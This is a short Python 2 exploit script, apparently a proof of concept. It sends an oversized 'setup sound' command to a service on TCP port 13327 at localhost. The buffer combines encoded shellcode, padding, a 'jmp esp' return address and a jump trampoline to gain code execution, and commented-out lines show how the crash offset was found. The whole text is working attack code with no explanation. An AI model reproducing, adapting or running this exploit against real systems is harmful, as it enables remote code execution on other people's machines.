#!/usr/bin/python
import socket
host = "127.0.0.1"

#nasm > add eax,12
#00000000  83C00C            add eax,byte +0xc
#nasm > JMP EAX
#00000000  FFE0              jmp eax

shellcode = (
"\xdb\xc2\xba\x60\x9c\x2e\xe8\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x14\x31\x55\x19\x83\xc5\x04\x03\x55\x15\x82\x69\x1f\x33\xb5"
"\x71\x33\x80\x6a\x1c\xb6\x8f\x6d\x50\xd0\x42\xed\xca\x43\x0f"
"\x85\xee\x7b\xbe\x09\x85\x6b\x91\xe1\xd0\x6d\x7b\x67\xbb\xa0"
"\xfc\xee\x7a\x3f\x4e\xf4\xcc\x59\x7d\x74\x6f\x16\x1b\xb9\xf0"
"\xc5\xbd\x2b\xce\xb1\xf0\x2b\x79\x3b\xf3\x43\x55\x94\x70\xfb"
"\xc1\xc5\x14\x92\x7f\x93\x3a\x34\xd3\x2a\x5d\x04\xd8\xe1\x1e")

#returnaddress:0x08134597: jmp esp
ret="\x97\x45\x13\x08"
#crash="\x41" * 4379
#crash="\x41"*4368 + "\x42"*4 + "C"*7
crash=shellcode+"\x41" * (4368-105) + ret + "\x83\xC0\x0C\xFF\xE0"+"\x90\x90"
#crash="\x41" * 4368 + ret + "\x83\xC0\x0C\xFF\xE0"+"\x90\x90"
buffer = "\x11(setup sound " + crash + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent !"


